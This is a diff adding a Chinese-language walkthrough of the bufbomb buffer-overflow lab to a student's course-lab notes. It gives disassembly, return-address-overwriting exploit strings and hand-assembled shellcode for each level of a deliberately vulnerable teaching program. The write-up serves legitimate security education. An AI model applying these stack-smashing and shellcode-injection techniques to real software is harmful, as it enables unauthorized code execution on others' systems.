@@ -360,7 +360,7 @@ switch跳转表：
 
 下面这个版本的不一样，但原理相同，可以看看。
 
-![p5_1](screenshot/p5-1.png)
+![p5_1](screenshot/p5_1.png)
 
 `Phase 6`<br>
 最后一关了，心情小激动。
@@ -579,6 +579,286 @@ int fun7(const int *a, int b)
 
 ![sp_3](screenshot/sp_3.png)
 ![sp_4](screenshot/sp_4.png)
+
+####Lab3
+####0x00 Preface
+我想说，缓冲区溢出攻击好有意思呀。<br>
+这个lab就是给你bufbomb让你各种溢出，shellcode各种插入。<br>
+主要的总共三个文件：
+>
+* bufbomb
+* bufbomb.c
+* sendstring
+
+运行bufbomb程序，会让你输入一段字符串，然后返回一个结果：
+
+![lab3_0](screenshot/lab3_0.png)
+
+我们就是要构造特殊的字符串来使程序栈溢出执行恶意代码。<br>
+由于肯定会输入一些不可打印字符，所以sendstring程序会将提供的16进制的exploit字符串转换为2进制字节码。<br>
+例如，我们将写好的溢出代码以16进制表示存到exploit.txt中，将sendstring生成的保存到test中：
+
+![lab3_1](screenshot/lab3_1.png)
+
+####0x01 Overflow It
+让我们看看这个被玩坏的程序：
+
+![lab3_2](screenshot/lab3_2.png)
+
+108行的`val = getbuf();`就是bufbomb读取输入的地方，而我们的目标也就是`getbuf()`函数了。
+```c
+unsigned long long getbuf()
+{
+  char buf[36];
+  volatile char* variable_length;
+  int i;
+  unsigned long long val = (unsigned long long)Gets(buf);
+  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
+  for(i = 0; i < 36; i++)
+  {
+  variable_length[i] = buf[i];
+  }
+  return val % 40;
+}
+```
+根据官方文档，`Gets()`与标准C库函数`gets()`相似，从标准输入读入字符串（以"\n"结尾）存到指定位置，同样不检查输入字符串长度边界，这给溢出提供了可能。
+
+####0x02 Level 0: Candle
+当`getbuf()`返回时，跳转执行提供的`smoke()`函数，而不是返回到`test()`继续执行。
+```c
+void smoke()
+{
+  entry_check(0);  /* Make sure entered this function properly */
+  printf("Smoke!: You called smoke()\n");
+  validate(0);
+  exit(0);
+}
+```
+让我们看看`getbuf()`的反汇编代码：
+```asm
+0000000000400da0 <getbuf>:
+  400da0: 55                    push   %rbp
+  400da1: 48 89 e5              mov    %rsp,%rbp
+  400da4: 48 83 ec 30           sub    $0x30,%rsp
+  400da8: 48 8d 7d d0           lea    -0x30(%rbp),%rdi
+  400dac: e8 ff fe ff ff        callq  400cb0 <Gets>
+  400db1: 48 ba cd cc cc cc cc  movabs $0xcccccccccccccccd,%rdx
+  400db8: cc cc cc 
+  400dbb: 48 89 c1              mov    %rax,%rcx
+  400dbe: 48 f7 e2              mul    %rdx
+  400dc1: 48 c1 ea 05           shr    $0x5,%rdx
+  400dc5: 48 8d 04 92           lea    (%rdx,%rdx,4),%rax
+  400dc9: 48 89 ca              mov    %rcx,%rdx
+  400dcc: 48 c1 e0 03           shl    $0x3,%rax
+  400dd0: 48 29 c2              sub    %rax,%rdx
+  400dd3: b8 24 00 00 00        mov    $0x24,%eax
+  400dd8: 48 83 fa 24           cmp    $0x24,%rdx
+  400ddc: 48 0f 43 c2           cmovae %rdx,%rax
+  400de0: 31 c9                 xor    %ecx,%ecx
+  400de2: 48 83 c0 1e           add    $0x1e,%rax
+  400de6: 48 83 e0 f0           and    $0xfffffffffffffff0,%rax
+  400dea: 48 29 c4              sub    %rax,%rsp
+  400ded: 4c 8d 44 24 0f        lea    0xf(%rsp),%r8
+  400df2: 49 83 e0 f0           and    $0xfffffffffffffff0,%r8
+  400df6: 66 2e 0f 1f 84 00 00  nopw   %cs:0x0(%rax,%rax,1)
+  400dfd: 00 00 00 
+  400e00: 0f b6 7c 0d d0        movzbl -0x30(%rbp,%rcx,1),%edi
+  400e05: 49 8d 34 08           lea    (%r8,%rcx,1),%rsi
+  400e09: 48 83 c1 01           add    $0x1,%rcx
+  400e0d: 48 83 f9 24           cmp    $0x24,%rcx
+  400e11: 40 88 3e              mov    %dil,(%rsi)
+  400e14: 75 ea                 jne    400e00 <getbuf+0x60>
+  400e16: 48 89 d0              mov    %rdx,%rax
+  400e19: c9                    leaveq 
+  400e1a: c3                    retq   
+  400e1b: 0f 1f 44 00 00        nopl   0x0(%rax,%rax,1)
+```
+可以看到，前面是基本的栈基址入栈操作，移动栈顶，接着分配48个字节作为存储字符串的空间，然后调用`Gets()`函数。为了让`getbuf()`不返回到`test()`中去，就要修改返回地址，使之指向`smoke()`，返回地址在每次压栈的`%rbp`上面。<br>
+而`smoke()`的入口地址为`0x4010c0`。
+```asm
+00000000004010c0 <smoke>:
+  4010c0: 48 83 ec 08           sub    $0x8,%rsp
+  4010c4: bf 45 13 40 00        mov    $0x401345,%edi
+  4010c9: c7 05 dd 11 20 00 00  movl   $0x0,0x2011dd(%rip)        # 6022b0 <check_level>
+  4010d0: 00 00 00 
+  4010d3: e8 08 f7 ff ff        callq  4007e0 <puts@plt>
+  4010d8: 31 ff                 xor    %edi,%edi
+  4010da: e8 51 fd ff ff        callq  400e30 <validate>
+  4010df: 31 ff                 xor    %edi,%edi
+  4010e1: e8 da f7 ff ff        callq  4008c0 <exit@plt>
+  4010e6: 66 2e 0f 1f 84 00 00  nopw   %cs:0x0(%rax,%rax,1)
+  4010ed: 00 00 00 
+```
+接下来就是编写exploit code了，为了能覆盖返回地址，写入的字符串要满足`Bytes: 48+8(%rbp)+8(ret addr)`，地址要注意endian。
+`41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 c0 e5 ff ff ff ff ff 7f c0 10 40 00`
+
+![lab3_3](screenshot/lab3_3.png)
+
+####0x03 Level 1: Sparkler
+这回调用的是`fizz()`函数，不同的是需要将自己的cookie作为参数传入。看看这函数，多了一个判断参数是否是cookie。
+```c
+void fizz(int arg1, char arg2, long arg3, char* arg4, short arg5, short arg6, unsigned long long val)
+{
+  entry_check(1);  /* Make sure entered this function properly */
+  if (val == cookie) {
+  printf("Fizz!: You called fizz(0x%llx)\n", val);
+  validate(1);
+  } else {
+  printf("Misfire: You called fizz(0x%llx)\n", val);
+  }
+  exit(0);
+}
+```
+下面是反汇编代码：
+```asm
+0000000000401070 <fizz>:
+  401070: 48 83 ec 08           sub    $0x8,%rsp
+  401074: c7 05 32 12 20 00 01  movl   $0x1,0x201232(%rip)        # 6022b0 <check_level>
+  40107b: 00 00 00 
+  40107e: 48 8b 74 24 10        mov    0x10(%rsp),%rsi
+  401083: 48 3b 35 96 12 20 00  cmp    0x201296(%rip),%rsi        # 602320 <cookie>
+  40108a: 74 13                 je     40109f <fizz+0x2f>
+  40108c: bf b0 15 40 00        mov    $0x4015b0,%edi
+  401091: 31 c0                 xor    %eax,%eax
+  401093: e8 58 f7 ff ff        callq  4007f0 <printf@plt>
+  401098: 31 ff                 xor    %edi,%edi
+  40109a: e8 21 f8 ff ff        callq  4008c0 <exit@plt>
+  40109f: bf 90 15 40 00        mov    $0x401590,%edi
+  4010a4: 31 c0                 xor    %eax,%eax
+  4010a6: e8 45 f7 ff ff        callq  4007f0 <printf@plt>
+  4010ab: bf 01 00 00 00        mov    $0x1,%edi
+  4010b0: e8 7b fd ff ff        callq  400e30 <validate>
+  4010b5: eb e1                 jmp    401098 <fizz+0x28>
+  4010b7: 66 0f 1f 84 00 00 00  nopw   0x0(%rax,%rax,1)
+  4010be: 00 00 
+```
+如何将参数传入呢？`0x401083`处的`cmp 0x201296(%rip),%rsi`，而`%rsi`被赋值为`0x10(%rsp)`，一开始`sub $0x8,%rsp`。理清一下思绪，跳转到该函数时，`%rsp`指向返回地址，然后`%rsp`减去8，然后再加16，所以此时指向的是参数地址，与返回地址相隔8个字节。所以构造以下结构：<br>
+`Bytes: 48+8(%rbp)+8(ret addr)+8+8(cookie)`<br>
+附上exploit code:
+`41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 70 10 40 00 00 00 00 00 00 00 00 00 00 00 00 00 ab 13 2e 15 bc 17 39 4c`
+注：关于参数一事，当小于6个时存放在寄存器中，只有6个以上的才会存放到栈中。
+
+![lab3_4](screenshot/lab3_4.png)
+
+####0x04 Level 2: Firecracker
+好吧，这是一个更加sophisticated的buffer攻击。因为，这关要你修改全局变量。
+```c
+unsigned long long global_value = 0;
+
+void bang(unsigned long long val)
+{
+  entry_check(2);  /* Make sure entered this function properly */
+  if (global_value == cookie) {
+  printf("Bang!: You set global_value to 0x%llx\n", global_value);
+  validate(2);
+  } else {
+  printf("Misfire: global_value = 0x%llx\n", global_value);
+  }
+  exit(0);
+}
+```
+可以看到`global_value`是一个全局变量，并不存放在栈中，那么我们如何修改使之等于cookie呢？所以这一关不是用之前的方法了，而是更高端的简单粗暴行之有效的直接注入shellcode执行代码。<br>
+首先寻找全局变量`global_value`的地址，查看汇编代码：
+```asm
+0000000000401020 <bang>:
+  401020: 48 83 ec 08           sub    $0x8,%rsp
+  401024: 48 8b 35 dd 12 20 00  mov    0x2012dd(%rip),%rsi        # 602308 <global_value>
+  40102b: 48 3b 35 ee 12 20 00  cmp    0x2012ee(%rip),%rsi        # 602320 <cookie>
+  401032: c7 05 74 12 20 00 02  movl   $0x2,0x201274(%rip)        # 6022b0 <check_level>
+  401039: 00 00 00 
+  40103c: 74 13                 je     401051 <bang+0x31>
+  40103e: bf 70 15 40 00        mov    $0x401570,%edi
+  401043: 31 c0                 xor    %eax,%eax
+  401045: e8 a6 f7 ff ff        callq  4007f0 <printf@plt>
+  40104a: 31 ff                 xor    %edi,%edi
+  40104c: e8 6f f8 ff ff        callq  4008c0 <exit@plt>
+  401051: bf 48 15 40 00        mov    $0x401548,%edi
+  401056: 31 c0                 xor    %eax,%eax
+  401058: e8 93 f7 ff ff        callq  4007f0 <printf@plt>
+  40105d: bf 02 00 00 00        mov    $0x2,%edi
+  401062: e8 c9 fd ff ff        callq  400e30 <validate>
+  401067: eb e1                 jmp    40104a <bang+0x2a>
+  401069: 0f 1f 80 00 00 00 00  nopl   0x0(%rax)
+```
+可以看到`0x2012dd(%rip)`就是全局变量的地址，随后被存放的`%rsi`中，这里我们下断点得到`0x602308`。<br>
+然后编写汇编代码：
+```asm
+movabs $0x4c3917bc152e13ab,%rax
+mov    $0x602308,%rbx
+mov    %rax,(%rbx)
+pushq  $0x401020
+retq   
+```
+生成对应的字节码：
+```
+gcc -c bang.s
+objdump -d bang.o
+```
+```asm
+0000000000000000 <.text>:
+   0: 48 b8 ab 13 2e 15 bc  movabs $0x4c3917bc152e13ab,%rax
+   7: 17 39 4c 
+   a: 48 c7 c3 08 23 60 00  mov    $0x602308,%rbx
+  11: 48 89 03              mov    %rax,(%rbx)
+  14: 68 20 10 40 00        pushq  $0x401020
+  19: c3                    retq   
+```
+接下来按照以下结构构造：<br>
+`Bytes: 26(code)+22+8(%rbp)+8(ret addr)`<br>
+其中返回地址应该是栈中code的地址，这个你可以下断点查看是多少。
+```
+48 b8 ab 13 2e 15 bc 17 39 4c 48 c7 c3 08 23 60 00 48 89 03 68 20 10 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 b7 ff ff ff 7f
+```
+注：为什么不使用jmp或call指令呢，因为这些指令使用相对寻址，设置非常有技巧性，我们还是简单粗暴点比较好，pushq&retq。
+
+![lab3_5](screenshot/lab3_5.png)
+
+好吧，由于gcc的保护机制，已经不允许执行栈中的代码了，所以当然不会成功，但由于gdb的特殊原因，可以让我们执行栈中的代码。
+
+![lab3_6](screenshot/lab3_6.png)
+
+####0x05 Level 3: Dynamite
+呃，这回居然让我们返回到`test()`函数，当然不是什么都不做的返回，而是让`getbuf()`带着cookie返回。
+```c
+unsigned long long getbuf()
+{
+  char buf[36];
+  volatile char* variable_length;
+  int i;
+  unsigned long long val = (unsigned long long)Gets(buf);
+  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
+  for(i = 0; i < 36; i++)
+  {
+  variable_length[i] = buf[i];
+  }
+  return val % 40;
+}
+```
+可是`getbuf()`返回的根本就不是cookie，难道？没错，关键时候还是自己手动返回吧。<br>
+根据`test()`的汇编代码，它在`0x400eee`处调用`getbuf()`，所以我们就返回到下一条指令处`0x400ef3`，并将`%rax`设置成自己的cookie。这里注意的是，我们还要将`%rbp`设置为`test()`的栈基址，不然`test()`返回时也会出现segment fault。
+```asm
+movabs $0x4c3917bc152e13ab,%rax
+movabs $0x7fffffffb780,%rbp
+pushq  $0x400ef3
+retq   
+```
+生成对应的字节码：
+```asm
+0000000000000000 <.text>:
+   0: 48 b8 ab 13 2e 15 bc  movabs $0x4c3917bc152e13ab,%rax
+   7: 17 39 4c 
+   a: 48 bd 80 b7 ff ff ff  movabs $0x7fffffffb780,%rbp
+  11: 7f 00 00 
+  14: 68 f3 0e 40 00        pushq  $0x400ef3
+  19: c3                    retq   
+```
+按照上一关相同的恶结构构造得到：
+```
+48 b8 ab 13 2e 15 bc 17 39 4c 48 bd 80 b7 ff ff ff 7f 00 00 68 f3 0e 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 b7 ff ff ff 7f
+```
+还是在gdb中运行：
+
+![lab3_7](screenshot/lab3_7.png)
 
 写在最后
 --------
